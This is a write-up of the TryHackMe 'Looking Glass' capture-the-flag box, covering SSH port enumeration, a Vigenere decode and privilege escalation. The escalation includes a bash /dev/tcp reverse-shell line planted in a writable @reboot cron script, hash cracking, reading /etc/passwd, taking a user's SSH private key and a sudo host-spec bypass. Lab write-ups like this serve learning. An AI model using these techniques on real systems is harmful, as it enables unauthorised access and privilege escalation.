---
title: "Looking Glass(THM)"
permalink: /writeups/lookingglass
---

# <a href="https://tryhackme.com/room/lookingglass" target="_blank">Looking Glass - THM</a>

## Tags
wonderland, ctf, alice, ssh

## Metadata

| Written | 26/07/2022
| Author | Thetvdh
| Platform | TryHackMe
| Box Type | Linux

## Tools used

- nmap
- ssh
- Python3
- NamethatHash
- awk
- grep
- sort


### Note : For the purposes of this box the target IP was 10.10.236.49

# Enumeration

Starting off as usual with a nmap scan

```s
sudo nmap -sVC -T4 -p- 10.10.236.49 -o nmap.txt
```

Now running this scan was taking forever. I finally gave up after 10 minutes and reevaluated my scan. I figured there was a large amount of open ports so I removed the scripts as all the scripts would have to run on every port.

```s
sudo nmap -sV -T4 -p- 10.10.236.49 -o nmap.txt
```

This completed much faster and I discovered why it was taking so long. Ports 9000-13999 were open as a SSH port running the Dropbear SSH service. I won't paste my nmap scan in here as it was massive but if you are interested in seeing it, the file is uploaded [here](/writeups/LookingGlass/nmap.txt)

We have no username but lets try and connect to a SSH port anyways.

```s 
ssh 10.10.236.49 -p 13999
Unable to negotiate with 10.10.236.49 port 13999: no matching host key type found. Their offer: ssh-rsa
```

I had run into this error before and had saved the link informing me how to fix this (Credit to bk2204 on StackOverflow for this fix, you can find it [here](https://stackoverflow.com/questions/69875520/unable-to-negotiate-with-40-74-28-9-port-22-no-matching-host-key-type-found-th))

### SSH negotation fix

```s
~/.ssh/config
Host 10.10.236.49
	PubkeyAcceptedAlgorithms +ssh-rsa
	HostkeyAlgorithms +ssh-rsa
```

Trying to connect again gives this output

```
The authenticity of host '[10.10.236.49]:13999 ([10.10.236.49]:13999)' can't be established.
RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.236.49]:13999' (RSA) to the list of known hosts.
Higher
```
Hmm, we have been given simply the word 'higher' and nothing else. Ok, let's try a different port.

```s
ssh 10.10.236.49 -p 9419
```

A different message is given here, it says 'lower'. This too me looks like a game of higher or lower, one of the first games people learning to program make. This time however they are using SSH services, an interesting take on the game i'll give them that!

We could do this manually but i'm lazy and I can write python, so I automated it. To make my script work I needed to add one more line to my ssh config file to make it look like this:

```s
Host 10.10.236.49
	PubkeyAcceptedAlgorithms +ssh-rsa
	HostkeyAlgorithms +ssh-rsa
	StrictHostKeyChecking no
```

This disables asking if you want to accept the key every time.

The following script can be downloaded from [here](/programs/python/ssh_enum.py) or can be copy and pasted from below.

```python
#!/usr/bin/python3
import subprocess

# These vars do not need to be changed unless the port numbers in the challenge change
found = False
top = 13999
bottom = 9000

ip = ""  # Replace this with your target IP address

# Note: When using this code for the CTF Challenge "Looking Glass" it sometimes hangs upon finding the correct port
# Rather than printing out the correct message.
while not found:
    try:
        mid = (top + bottom) // 2
        print(f"Trying {mid}...")
        cmd = f"ssh {ip} -p {mid} -q"

        output = subprocess.check_output(cmd, shell=True)
        output = output.decode()
        output = output.strip('\n')
        output = output.strip('\r')

        if output == "Higher":
            top = mid
        elif output == "Lower":
            bottom = mid
        else:
            print("Found port", mid)
            exit()

        
    except subprocess.CalledProcessError as err:
        print(err)

```
Leaving it to run will eventually reveal the correct port which we can SSH into.

Connecting to this port gives us a bunch of gibberish. My first thought was a ROT13 (caesar) cipher. I threw it into [CyberChef](https://gchq.github.io/CyberChef) and tried it. It was not a ROT13 cipher.

I decided to put it into an online Cipher analysis tool to see what it came up with. I used [Boxentriq](https://www.boxentriq.com/code-breaking/cipher-identifier) and it suggested:

- Bifid Cipher
- Vigenere Cipher

Bifif cipher didn't work so I decided it must be Vigenere. Vigenere cipher uses a key to encode its ciphertext and to reverse it you need that code. In the gibberish pulled from the SSH server the only word in plaintext was 'jabberwocky', so I tried that and unfortunately it didn't work. Boxentriq has an auto solve function so I set the max key length to 50 and left it running for a bit. I came back after about 10 minutes and it had found the key and decoded the text!

Entering the newly aquired secret into the SSH gives us a SSH username and password, presumably for the Port 22 OpenSSH.

Attempting to connect to port 22 with these credentials worked and we have access now.

## From this point I will be assuming you have got SSH access and will not be censoring usernames. Passwords and flags will still be censored.

# Flag 1 - User.txt

```sh
ls -la
cat user.txt
```

# Flag 2 - Root.txt


## Jabberwock account

It's always good to do recon on what other users are on a system as you may potentially want to move sideways into one of their accounts to get a better foothold and or a new privesc vector. To do this you can use this command to get a list of all users with a logon:

```sh
grep -i "/bin/bash" /etc/passwd | awk -F ":" '{print $1}' | sort > users.txt
```

Now we have a list of users, we can look at potentially escalating to one of their accounts and eventually to root.

Running sudo -l is my next point of call
```s
sudo -l
Matching Defaults entries for jabberwock on looking-glass:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jabberwock may run the following commands on looking-glass:
    (root) NOPASSWD: /sbin/reboot
``` 

Interesting. We  can run reboot as root. I had a quick check of [GTFOBins](https://gtfobins.github.io/) just incase but unsurprisingly nothing.

The fact there was a reboot made me think that something was scheduled to happen on startup, so I checked the crontab.

```sh
cat /etc/crontab

@reboot tweedledum bash /home/jabberwock/twasBrillig.sh
```
This is a very interesting line. It runs that shell script on startup as the tweedledum account. Let's have a look at that shell script.

Well this is just shocking security really,  it's almost as if someone wanted me to escalate privileges. We have write permissions to this shell file so we can create a reverse shell to our machine as tweedledum.

```sh

# Target
echo 'bash -i >& /dev/tcp/10.9.10.243/6666 0>&1' > twasBrillig.sh

# Attacker machine

nc -lvnp 6666

# Target

sudo /sbin/reboot
```

Once the machine has rebooted (it can take a minute or two because of all the SSH services) we get a reverse connection to our listener! Wonderful

## Tweedledum account

Let's quickly stablise this shell

```sh

python3 -c 'import tty;tty.spawn("/bin/bash")'
export TERM=xterm-256color
CTRL+Z
stty raw -echo | fg
```

```sh
ls -la
```

We have two text files:

- humptydumpty.txt
- poem.txt

Poem.txt appears to just contain a poem, nothing interesting

humptydumpty.txt contains what appears to be a bunch of hashes

```sh
echo '<HASH>' > hash.txt
nth --file hash.txt
```

Running NameThatHash against the hash suggests they are SHA-256 hashes so lets fire hashcat against the file

```sh
hashcat -a 0 -m 1400 hash.txt /usr/share/wordlists/rockyou.txt
```

Hashcat only cracks 5 hashes when there appears to be 8 in the file. This is odd so I deleted the cracked hashes from the file and tried again. Hashcat again failed to crack them so I deduced that the challenge was either broken (which was highly unlikely) or they weren't hashes.

I left it for now and checked the standard stuff on tweedledum: 

- sudo -l
- SUID bits
- cronjobs 
etc

The only thing we can do is run /bin/bash as tweedledee which turned out to be a dead end as tweedledee could only run /bin/bash as tweedledum. I decided it must have something to do with the hashes so I put them into [CyberChef](https://gchq.github.io/CyberChef)

Two of them didn't do anything but the final one turned out to be in hex! Decoding the hex gave us the following string:

"the password is \<REDACTED>"

This password was in the text file called humptydumpty.txt so I attempted to SSH into his user account. It failed and I was very confused for about 5 minutes before I realised I am stupid and I have a SSH session as Jabberwock where I can just su into humptydumpty's account.

```sh
su humptydumpty
```

## Humptydumpty account

I ran all the usual checks against humptydumpty's account and nothing of interest came up so I ran both Linpeas and Linux Smart Enumeration against the box. LinPeas showed that the user 'alice' can run /bin/bash as root which is our final vector, so we just need to become alice somehow.

I'm more than happy to admit this took me a really long time to find as I wasn't really paying attention and if you take anything from this writeup it is this:

# **CHECK FILE PERMISSIONS CLOSELY**

I noticed that /home/alice had execute permissions set on it. This means we can run commands on the user and expose files without actually needing to read them. This can be done like so:

```sh
cd /home/alice/.bashrc
bash: cd: /home/alice/.bashrc: Not a directory:
```

I then tried to cd into alice's .ssh file and it worked. We still don't have read permissions so we can't actually see anything in this directory, but the same trick works.

```sh
bash: cd: id_rsa: Not a directory
```

We have alices id_rsa file now so we can copy and paste that over onto our attackers machine.

We need to change the permissions on this file 

```sh
chmod 400 id_rsa
```

ssh alice@10.10.236.49 -i id_rsa

# Alice account
```sh
sudo /bin/bash
```

Huh? Why did this fail? sudo -l says (NOPASSWD) for /bin/bash so why is it asking for a password?

I went away and did some reading on the subject and it finally clicked!

In the sudoers file it says 

```sh
alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
```
This is saying that alice can run /bin/bash with NOPASSWD as root on the host ssalg-gnikool

Running hostname shows that the current host is actually looking-glass. We can set the host in the sudo command however so lets do that.
```sh
sudo -h ssalg-gnikool /bin/bash
```
There we go! We are now root. root.txt is found in the /root.

# Conclusion

This was a really fun box! It was a puzzle style box rather than a realistic engagement but it was good fun to practise my privilege escalation skills and also strech the scripting muscles again. All in all it was fun and if they make a third box in this series I will definitely be doing it!